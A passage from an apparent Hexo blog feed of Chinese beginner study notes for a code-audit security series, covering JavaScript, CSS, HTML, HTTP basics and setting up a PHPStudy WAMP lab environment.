class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> object) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="七、函数"><a href="#七、函数" class="headerlink" title="七、函数"></a>七、函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">var1,var2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">代码</span><br><span class="line">return 返回值 #有需要时用</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="八、JS通过对象操作浏览器（BOM）"><a href="#八、JS通过对象操作浏览器（BOM）" class="headerlink" title="八、JS通过对象操作浏览器（BOM）"></a>八、JS通过对象操作浏览器（BOM）</h3><p>1、Window对象：代表浏览器窗口，全局变量是 window 对象的属性，全局函数是 window 对象的方法，甚至 HTML DOM 的 document 也是 window 对象的属性之一。</p><p>2、window.navigator对象：包含有关访问者浏览器的信息。</p><blockquote><p><strong>window.navigator</strong> 对象在编写时可不使用 window 这个前缀。</p><p>navigator.userappVersion、navigator.userAgent</p></blockquote><p>3、window.screen对象：屏幕信息。</p><p>4、window.location对象：URL信息。</p><p>5、window.document对象：当前页面。</p><h3 id="九、JS通过对象操作页面（DOM）"><a href="#九、JS通过对象操作页面（DOM）" class="headerlink" title="九、JS通过对象操作页面（DOM）"></a>九、JS通过对象操作页面（DOM）</h3><p>1、查找标签、节点等方法1、：<code>document.getElementById、document.getElementsByXXX、节点名.childer、节点名.firstElementChild、节点名.lastElementChild</code></p><p>2、操作cookie：<code>document.cookie=&#123;&quot;name=AJEST&quot;&#125;</code></p><h3 id="十、JS事件"><a href="#十、JS事件" class="headerlink" title="十、JS事件"></a>十、JS事件</h3><p>用户触发事件的判断：鼠标事件(onclick)、键盘事件、form事件……</p><p>对触发的事件做事件响应：写在html标签中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span> <span class="attr">value</span>=<span class="string">&quot;bu1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;fm()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;bu2&quot;</span> /&gt;</span>#鼠标悬停</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">fm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&#x27;xss&#x27;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4、CSS语言</title>
      <link href="/2020/07/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/4%E3%80%81CSS%E8%AF%AD%E8%A8%80/"/>
      <url>/2020/07/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/4%E3%80%81CSS%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="CSS语言"><a href="#CSS语言" class="headerlink" title="CSS语言"></a>CSS语言</h2><h3 id="一、什么是CSS"><a href="#一、什么是CSS" class="headerlink" title="一、什么是CSS"></a>一、什么是CSS</h3><p>层叠样式表 (<em>C</em>ascading <em>S</em>tyle <em>S</em>heets)，提倡代码的编写中，CSS和HTML分离。</p><h3 id="二、常用CSS样式"><a href="#二、常用CSS样式" class="headerlink" title="二、常用CSS样式"></a>二、常用CSS样式</h3><p>元素内容的颜色：<code>color</code></p><blockquote><p>RGB颜色：<code>rgb([0-255],[0-255],[0-255])、#FFFFFF</code></p></blockquote><p>元素内容的背景色：<code>background-color</code></p><p>字体大小：<code>font-size</code></p><h3 id="三、CSS部署方式"><a href="#三、CSS部署方式" class="headerlink" title="三、CSS部署方式"></a>三、CSS部署方式</h3><p>1、内联样式：把CSS写在标签内部style属性的值中。</p><p>2、内部样式：在<code>&lt;head&gt;&lt;/head&gt;</code>标签中的<code>&lt;style type=&quot;text/css&quot;&gt;&lt;/style&gt;</code>标签中用<u>选择器</u>定义css样式。</p><p>​    <strong>选择器</strong>：1、标签选择器：<code>标签名 &#123;样式&#125;</code>；2、类选择器：<code>.类名 &#123;样式&#125;</code>；3、id选择器：<code>#id &#123;样式&#125;</code></p><p>3、外部样式：用.css为文件后缀的文件专门存放css样式内容。使用<code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css文件地址&quot;&gt;</code>来导入外部存储的样式。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3、HTML</title>
      <link href="/2020/07/28/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/3%E3%80%81HTML%E8%AF%AD%E8%A8%80/"/>
      <url>/2020/07/28/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/3%E3%80%81HTML%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="HTML语言"><a href="#HTML语言" class="headerlink" title="HTML语言"></a>HTML语言</h2><h3 id="一、什么是HTML？"><a href="#一、什么是HTML？" class="headerlink" title="一、什么是HTML？"></a>一、什么是HTML？</h3><p>HTML 是用来描述网页的一种语言，属于解释型的语言。以.html、.htm为文件拓展名。</p><ul><li>HTML 指的是超文本标记语言 (<strong>H</strong>yper <strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage)</li><li>HTML 不是一种编程语言，而是一种<strong>标记语言</strong>(markup language)</li><li>标记语言是一套<strong>标记标签</strong> (markup tag)</li><li>HTML 使用<strong>标记标签</strong>来描述网页</li></ul><h3 id="二、HTML基础"><a href="#二、HTML基础" class="headerlink" title="二、HTML基础"></a>二、HTML基础</h3><p><strong>HTML标记语言</strong>：尖括号包含关键字组成标签。</p><p><strong>HTML标签</strong>：有双标签和单标签。标签中有属性，属性的格式是键值对。</p><p><code>&lt;html&gt;</code>    开始标签； <code>&lt;/html&gt;</code>    结束标签。（双标签）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">一个标准的HTML文档结构：html(head、body)</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;        #头部head包括文档控制信息，包括整个页面的编码、说明等。</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;        #身体body包含真正显示在网页的内容</span><br><span class="line">    </span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="三、HTML文档结构"><a href="#三、HTML文档结构" class="headerlink" title="三、HTML文档结构"></a>三、HTML文档结构</h3><p>HTML文档在浏览器中被渲染时，浏览器将其分析为一颗DOM树形结构（DOM文档对象模型 由浏览器构造），以<code>&lt;html&gt;&lt;/html&gt;</code>为根节点。</p><h4 id="四、HTML常用标签"><a href="#四、HTML常用标签" class="headerlink" title="四、HTML常用标签"></a>四、HTML常用标签</h4><p><code>&lt;title&gt;&lt;/title&gt;</code>    #浏览器标签页的标题</p><p><code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>    #通知浏览器当前页面的编码格式是utf-8</p><p><code>&lt;hn&gt;&lt;/hn&gt;</code>    #标题标签：n越大，字体越小。</p><p><code>&lt;p&gt;&lt;/p&gt;</code>    #段落标签：定义段落。</p><p><code>&lt;hr/&gt;</code>    #水平线</p><p><code>&lt;br/&gt;</code>    #换行标签</p><p><code>&lt;span style=&quot;XXX&quot;&gt;&lt;/span&gt;</code>    #定义行内元素属性的标签</p><p><code>&lt;div&gt;&lt;/div&gt;</code>    #块级元素</p><p><code>&lt;a&gt;&lt;/a&gt;</code>    #超链接标签</p><blockquote><p>href属性    跳转的地址</p><p>target属性    如果不写target跳转页面在当前标签页打开;如果该属性赋值”_blank”，在新的标签页打开；也可以指定一个iframe，将新页面在iframe中嵌入</p></blockquote><p><code>&lt;img&gt;&lt;/img&gt;</code>    #图片标签</p><blockquote><p>src属性    图片的地址</p></blockquote><p><code>&lt;pre&gt;&lt;/pre&gt;</code>    #格式化输出标签，常用于显示源代码</p><h3 id="五、注释与特殊字符"><a href="#五、注释与特殊字符" class="headerlink" title="五、注释与特殊字符"></a>五、注释与特殊字符</h3><p>1、注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    注释不会显示在前台页面，但是会出现在源代码中。</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>2、特殊字符/字符实体</p><p><a href="https://www.w3school.com.cn/html/html_entities.asp">https://www.w3school.com.cn/html/html_entities.asp</a></p><p><code>&amp;nbsp;</code>    #空格</p><h3 id="六、HTML表格"><a href="#六、HTML表格" class="headerlink" title="六、HTML表格"></a>六、HTML表格</h3><p><code>&lt;table&gt;&lt;/table&gt;</code>    #表格</p><p><code>&lt;tr&gt;&lt;/tr&gt;</code>    #行</p><p><code>&lt;td&gt;&lt;/td&gt;</code>    #列</p><blockquote><p>colspan    跨列属性</p><p>rowspan    跨行属性</p></blockquote><h3 id="七、HTML表单"><a href="#七、HTML表单" class="headerlink" title="七、HTML表单"></a>七、HTML表单</h3><p><strong>什么是表单</strong>：表单实际上就是一个框架，里面包括了很多空间元素，是与后台服务器进行数据交互的主要载体。</p><p><code>&lt;form&gt;&lt;/form&gt;</code>    #表单</p><blockquote><p>action    数据提交到服务器的URL，如果为空提交到当前页面，也可使用绝对路径和相对路径</p><p>method    提交方法(get post head options )，默认是get</p><p>enctype    （application/x-www-form-urlencoded默认值、multipart/form-data上传文件时使用）</p></blockquote><p><code>&lt;input /&gt;</code>    #输入框</p><blockquote><p>name    给标签起个名字（变量名）</p><p>value    标签的值（变量值）</p><p>type    标签类型</p><p>​            (password密码框、text文本框、radio单选框、checkbox多选框、reset重置该表单内容的按钮、submit提交此表单的按钮、file文件域、hidden 隐藏内容，一般用于存储token)，多个框需要同一个名字</p></blockquote><p><code>&lt;select&gt;&lt;/select&gt;</code>    #选择框</p><p><code>&lt;option&gt;&lt;/option&gt;</code>    #选择框内的选项</p><blockquote><p>selected selected 属性规定在页面加载时预先选定该选项。</p></blockquote><p><code>&lt;textarea&gt;&lt;/textarea&gt;</code>        #文本域，可以输入回车换行符号</p><h3 id="八、iframe标签"><a href="#八、iframe标签" class="headerlink" title="八、iframe标签"></a>八、iframe标签</h3><p>iframe是一个可以内嵌其他网页文档的行内元素。</p><p><code>&lt;iframe&gt;&lt;/iframe&gt;</code></p><blockquote><p>src    iframe中嵌入的文档地址</p><p>height    高度</p><p>width    宽度</p><p>framebroder    是否显示边框</p><p>scrolling    是否显示滚动条</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2、Http协议</title>
      <link href="/2020/07/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/2%E3%80%81Http%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/07/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/2%E3%80%81Http%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Http协议"><a href="#Http协议" class="headerlink" title="Http协议"></a>Http协议</h2><p><a href="https://labuladong.gitbook.io/algo/labuladong-he-ta-de-peng-you-men/30-zhang-tu-jie-http-chang-jian-mian-shi-ti#05-http-1-1http-2-http3-yan-bian">https://labuladong.gitbook.io/algo/labuladong-he-ta-de-peng-you-men/30-zhang-tu-jie-http-chang-jian-mian-shi-ti#05-http-1-1http-2-http3-yan-bian</a></p><h3 id="一、什么是Http协议"><a href="#一、什么是Http协议" class="headerlink" title="一、什么是Http协议"></a>一、什么是Http协议</h3><p>超文本传输协议（英文：<strong>H</strong>yper<strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol，缩写：HTTP）HTTP 是一个在计算机世界里专门在「两点」之间「传输」文字、图片、音频、视频等「超文本」数据的「约定和规范」。</p><p><u>目前应用最广泛的Http协议是Http1.1</u></p><h3 id="二、Http协议的特点"><a href="#二、Http协议的特点" class="headerlink" title="二、Http协议的特点"></a>二、Http协议的特点</h3><p><strong>1、简单快速</strong>：向服务器发出请求，只需要提供请求方法和请求路径。请求方法常用的有GET、HEAD、POST。</p><p>​    HTTP 基本的报文格式就是 <code>header + body</code>，头部信息也是 <code>key-value</code> 简单文本的形式，<strong>易于理解</strong>，降低了学习和使用的门槛。</p><p><strong>2、灵活</strong>：Http协议支持传输任何类型的数据对象。数据对象类型由Content-Type标记。</p><p><strong>3、无连接</strong>：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</p><p><strong>4、无状态</strong>：Http协议是无状态协议，无状态是指Http协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重新来过。</p><blockquote><p>无状态的<strong>好处</strong>，因为服务器不会去记忆 HTTP 的状态，所以不需要额外的资源来记录状态信息，这能减轻服务器的负担，能够把更多的 CPU 和内存用来对外提供服务。</p><p>无状态的<strong>坏处</strong>，既然服务器没有记忆能力，它在完成有关联性的操作时会非常麻烦。</p><p>例如登录-&gt;添加购物车-&gt;下单-&gt;结算-&gt;支付，这系列操作都要知道用户的身份才行。但服务器不知道这些请求是有关联的，每次都要问一遍身份信息。    </p><p>对于无状态的问题，解法方案有很多种，其中比较简单的方式用 <strong>Cookie</strong> 技术。</p><p><code>Cookie</code> 通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。</p></blockquote><p><strong>5、长连接：</strong>早期 HTTP/1.0 性能上的一个很大的问题，那就是每发起一个请求，都要新建一次 TCP 连接（三次握手），而且是串行请求，做了无谓的 TCP 连接建立和断开，增加了通信开销。</p><p>​    为了解决上述 TCP 连接问题，HTTP/1.1 提出了<strong>长连接</strong>的通信方式，也叫持久连接。这种方式的好处在于减少了 TCP 连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。</p><p>​    持久连接的特点是，只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。</p><p><a href="https://imgchr.com/i/akfnHI"><img src="https://s1.ax1x.com/2020/07/28/akfnHI.png" alt="akfnHI.png"></a></p><p><strong>6、管道网络传输：</strong>HTTP/1.1 采用了长连接的方式，这使得管道（pipeline）网络传输成为了可能。即可在同一个 TCP 连接里面，客户端可以发起多个请求，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以<strong>减少整体的响应时间。</strong></p><p>​    举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送 A 请求，然后等待服务器做出回应，收到后再发出 B 请求。管道机制则是允许浏览器同时发出 A 请求和 B 请求。但是服务器还是按照<strong>顺序</strong>，先回应 A 请求，完成后再回应 B 请求。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为「队头堵塞」。</p><p><a href="https://imgchr.com/i/akfQ4f"><img src="https://s1.ax1x.com/2020/07/28/akfQ4f.png" alt="akfQ4f.png"></a></p><h3 id="三、URL"><a href="#三、URL" class="headerlink" title="三、URL"></a>三、URL</h3><h4 id="1、URL：-统一资源定位器-Uniform-Resource-Locators"><a href="#1、URL：-统一资源定位器-Uniform-Resource-Locators" class="headerlink" title="1、URL： 统一资源定位器(Uniform Resource Locators)"></a>1、URL： 统一资源定位器(Uniform Resource Locators)</h4><p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接，URL是一种特殊类型的URI。</p><p>1）URL格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme:&#x2F;&#x2F;host.domain:port&#x2F;path&#x2F;filename?args#锚</span><br></pre></td></tr></table></figure><blockquote><ul><li>scheme - 定义因特网服务的类型。最常见的类型是 http(https/ftp/file)</li><li>host - 定义域主机（http 的默认主机是 www）</li><li>domain - 定义因特网域名，比如 runoob.com （host-domain可以是IP地址）</li><li>:port - 定义主机上的端口号（http 的默认端口号是 80）</li><li>path - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。</li><li>filename - 定义文档/资源的名称</li><li>args - 传入文档的参数</li><li>锚部分：从#到最后，定位页面</li></ul></blockquote><p>2）URL的字符编码：URL中只能用ASCII字符集，非ASCII字符集要经过编码，并且每字节编码前都要加%。（google浏览器显示URL中的汉字不会转换，但IE浏览器会转换为utf-8）。另外，URL 不能包含空格。URL 编码通常使用 + 来替换空格。</p><h3 id="四、Http请求报文"><a href="#四、Http请求报文" class="headerlink" title="四、Http请求报文"></a>四、Http请求报文</h3><p><a href="https://imgchr.com/i/akDpJs"><img src="https://s1.ax1x.com/2020/07/28/akDpJs.png" alt="akDpJs.png"></a></p><p>请求方法：Http1.1中定义9种方法：GET、POST、HEAD、OPTIONS、PUT、PATCH、DELETE、TRACE 、CONNECT </p><blockquote><table><thead><tr><th align="left">序号</th><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">GET</td><td align="left">请求指定的页面信息，并返回实体主体。</td></tr><tr><td align="left">2</td><td align="left">HEAD</td><td align="left">类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td align="left">3</td><td align="left">POST</td><td align="left">向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。</td></tr><tr><td align="left">4</td><td align="left">PUT</td><td align="left">从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td align="left">5</td><td align="left">DELETE</td><td align="left">请求服务器删除 Request-URI 所标识的资源。</td></tr><tr><td align="left">6</td><td align="left">CONNECT</td><td align="left">HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td align="left">7</td><td align="left">OPTIONS</td><td align="left">返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性，允许客户端查看服务器的性能。</td></tr><tr><td align="left">8</td><td align="left">TRACE</td><td align="left">回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td align="left">9</td><td align="left">PATCH</td><td align="left">是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td></tr></tbody></table><p>虽然 HTTP 的请求方式有 8 种，但是我们在实际应用中常用的也就是 <strong>get</strong> 和 <strong>post</strong>，其他请求方式也都可以通过这两种方式间接的来实现。</p></blockquote><p>头部字段：</p><blockquote><p>Host：客户端发送请求时，用来指定服务器的域名。有了 <code>Host</code> 字段，就可以将请求发往「同一台」服务器上的不同网站。</p><p>Referer字段：该请求报文从哪个URL地址发送。</p><p>Connection 字段：<code>Connection</code> 字段最常用于客户端要求服务器使用 TCP 持久连接，以便其他请求复用。HTTP/1.1 版本的默认连接都是持久连接，但为了兼容老版本的 HTTP，需要指定 <code>Connection</code> 首部字段的值为 <code>Keep-Alive</code>。一个可以复用的 TCP 连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段。</p><p>Accept字段：客户端请求的时候，可以使用 <code>Accept</code> 字段声明自己可以接受哪些数据格式。</p><p>Accept-Encoding字段：客户端在请求时，用 <code>Accept-Encoding</code> 字段说明自己可以接受哪些压缩方法。</p><p>Cookie字段：缓存数据。</p></blockquote><h3 id="五、Http响应报文"><a href="#五、Http响应报文" class="headerlink" title="五、Http响应报文"></a>五、Http响应报文</h3><p><a href="https://imgchr.com/i/akyvXq"><img src="https://s1.ax1x.com/2020/07/28/akyvXq.png" alt="akyvXq.png"></a></p><p>头部字段：</p><blockquote><p>Server 字段：服务器类型。</p><p>Content-Length 字段：服务器在返回数据时，会有 <code>Content-Length</code> 字段，表明本次回应的数据长度。</p><p>Connection 字段：<code>Connection</code> 字段最常用于客户端要求服务器使用 TCP 持久连接，以便其他请求复用。HTTP/1.1 版本的默认连接都是持久连接，但为了兼容老版本的 HTTP，需要指定 <code>Connection</code> 首部字段的值为 <code>Keep-Alive</code>。一个可以复用的 TCP 连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段。</p><p>Content-Type 字段：<code>Content-Type</code> 字段用于服务器回应时，告诉客户端，本次数据是什么格式。</p><p>Content-Encoding 字段：<code>Content-Encoding</code> 字段说明数据的压缩方法。表示服务器返回的数据使用了什么压缩格式</p><p>Keep-Alive字段：表明保持连接状态的时间等信息。</p></blockquote><h3 id="六、Http响应报文字段Content-type详解"><a href="#六、Http响应报文字段Content-type详解" class="headerlink" title="六、Http响应报文字段Content-type详解"></a>六、Http响应报文字段Content-type详解</h3><p>Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=something</span><br></pre></td></tr></table></figure><p>常见的媒体格式类型如下：</p><ul><li>text/html ： HTML格式</li><li>text/plain ：纯文本格式</li><li>text/xml ： XML格式</li><li>image/gif ：gif图片格式</li><li>image/jpeg ：jpg图片格式</li><li>image/png：png图片格式</li></ul><p>以application开头的媒体格式类型：</p><ul><li>application/xhtml+xml ：XHTML格式</li><li>application/xml： XML数据格式</li><li>application/atom+xml ：Atom XML聚合格式</li><li>application/json： JSON数据格式</li><li>application/pdf：pdf格式</li><li>application/msword ： Word文档格式</li><li>application/octet-stream ： 二进制流数据（如常见的文件下载）</li><li>application/x-www-form-urlencoded ： <form encType=””>中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</li></ul><p>另外一种常见的媒体格式是上传文件之时使用的：</p><ul><li>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</li></ul><h3 id="七、Http常见的状态码"><a href="#七、Http常见的状态码" class="headerlink" title="七、Http常见的状态码"></a>七、Http常见的状态码</h3><p><a href="https://imgchr.com/i/aiHc7j"><img src="https://s1.ax1x.com/2020/07/27/aiHc7j.png" alt="aiHc7j.png"></a></p><h3 id="八、实验：利用Cmd的telnet构造请求报文，向百度发送get请求"><a href="#八、实验：利用Cmd的telnet构造请求报文，向百度发送get请求" class="headerlink" title="八、实验：利用Cmd的telnet构造请求报文，向百度发送get请求"></a>八、实验：利用Cmd的telnet构造请求报文，向百度发送get请求</h3><p>1、<code>telnet www.baidu.com 80</code></p><p>2、按下<code>Ctrl + ]</code></p><p>3、回车</p><p>4、输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">Host:www.baidu.com</span><br></pre></td></tr></table></figure><p>5、成功获得http响应报文</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1、部署实验WAMP环境——PHPStudy</title>
      <link href="/2020/07/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/1%E3%80%81%E9%83%A8%E7%BD%B2%E5%AE%9E%E9%AA%8CWAMP%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94PHPStudy/"/>
      <url>/2020/07/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/1%E3%80%81%E9%83%A8%E7%BD%B2%E5%AE%9E%E9%AA%8CWAMP%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94PHPStudy/</url>
      
        <content type="html"><![CDATA[<h2 id="部署实验WAMP环境——PHPStudy"><a href="#部署实验WAMP环境——PHPStudy" class="headerlink" title="部署实验WAMP环境——PHPStudy"></a>部署实验WAMP环境——PHPStudy</h2><h3 id="一、Windows2008部署经典Web服务器架构WAMP"><a href="#一、Windows2008部署经典Web服务器架构WAMP" class="headerlink" title="一、Windows2008部署经典Web服务器架构WAMP"></a>一、Windows2008部署经典Web服务器架构WAMP</h3><blockquote><p>使用环境部署框架软件：<strong>PHPStudy</strong>2016版本 （集成环境</p></blockquote><p>1、安装PhpStudy，安装后发现Apache服务无法开启，原因是缺少VC9运行库，安装X86的VC9运行库后成功开启Apache、PHP服务。访问<code>127.0.0.1</code>本地web服务，发现PHPStudy探针，说明环境搭建完成。</p><p>2、使用PHPStudy探针网页下方自带的mysql客户端尝试连接本地Mysql服务，用户名密码都是root。</p><h3 id="二、Apache服务器目录分析"><a href="#二、Apache服务器目录分析" class="headerlink" title="二、Apache服务器目录分析"></a>二、Apache服务器目录分析</h3><h4 id="1、Web根目录分析"><a href="#1、Web根目录分析" class="headerlink" title="1、Web根目录分析"></a>1、Web根目录分析</h4><blockquote><p>phpStudy\WWW</p></blockquote><p>1）探针网页：l.php</p><p>2）PHPinfo页面：phpinfo.php</p><p>3）phpmyadmin页面：基于php的MysqlWeb客户端</p><h4 id="2、Apache配置文件分析"><a href="#2、Apache配置文件分析" class="headerlink" title="2、Apache配置文件分析"></a>2、Apache配置文件分析</h4><blockquote><p>phpStudy/Apache/httpd.conf</p></blockquote><p>分析Apache配置文件httpd.conf，<code>Document root</code>是网站主页的文件夹路径</p><h3 id="3、Apache日志文件"><a href="#3、Apache日志文件" class="headerlink" title="3、Apache日志文件"></a>3、Apache日志文件</h3><blockquote><p>phpStudy/Apache/logs/</p></blockquote><h3 id="三、Mysql服务目录分析"><a href="#三、Mysql服务目录分析" class="headerlink" title="三、Mysql服务目录分析"></a>三、Mysql服务目录分析</h3><h4 id="1、Mysql启动命令"><a href="#1、Mysql启动命令" class="headerlink" title="1、Mysql启动命令"></a>1、Mysql启动命令</h4><blockquote><p>phpStudy/MySQL/bin #将此目录加入环境变量，方便命令行控制</p></blockquote><h4 id="2、Mysql配置文件"><a href="#2、Mysql配置文件" class="headerlink" title="2、Mysql配置文件"></a>2、Mysql配置文件</h4><blockquote><p>phpStudy/MySQL/my.ini</p></blockquote><h3 id="四、PHP目录分析"><a href="#四、PHP目录分析" class="headerlink" title="四、PHP目录分析"></a>四、PHP目录分析</h3><h4 id="1、PHP探针：phpinfo"><a href="#1、PHP探针：phpinfo" class="headerlink" title="1、PHP探针：phpinfo()"></a>1、PHP探针：<code>phpinfo()</code></h4><h4 id="2、PHP配置文件"><a href="#2、PHP配置文件" class="headerlink" title="2、PHP配置文件"></a>2、PHP配置文件</h4><blockquote><p>phpStudy/php/php你的版本/php.ini</p></blockquote><p>分析PHP文件夹，需要注意PHPStudy软件上提示的PHP版本，去对应版本的PHP问价夹中的php.ini配置文件进行配置</p><h4 id="3、PHP启动路径"><a href="#3、PHP启动路径" class="headerlink" title="3、PHP启动路径"></a>3、PHP启动路径</h4><blockquote><p>phpStudy/php/php你的版本    #将此目录加入环境变量，方便命令行控制</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12、Shell脚本</title>
      <link href="/2020/07/26/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/12%E3%80%81Shell%E8%84%9A%E6%9C%AC/"/>
      <url>/2020/07/26/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/12%E3%80%81Shell%E8%84%9A%E6%9C%AC/</url>
      
